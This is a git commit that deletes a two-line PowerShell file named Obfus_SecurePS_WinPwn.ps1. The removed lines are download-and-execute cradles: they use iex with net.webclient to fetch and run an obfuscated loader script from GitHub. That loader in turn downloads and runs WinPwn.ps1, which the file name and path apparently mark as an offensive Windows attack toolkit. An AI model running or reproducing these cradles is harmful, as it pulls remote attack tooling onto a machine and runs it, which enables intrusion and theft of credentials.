0d2c50e18ae797ee727ed52e506c36816112a66f
S3cur3Th1sSh1t <27858067+S3cur3Th1sSh1t@users.noreply.github.com>
2022-04-29 18:58:12 +0200

    Delete Obfus_SecurePS_WinPwn.ps1

--- Obfus_SecurePS_WinPwn.ps1
+++
@@ -1,2 +0,0 @@
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Run-SecurePS.ps1')
-Run-SecurePS -argument " -c iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')"
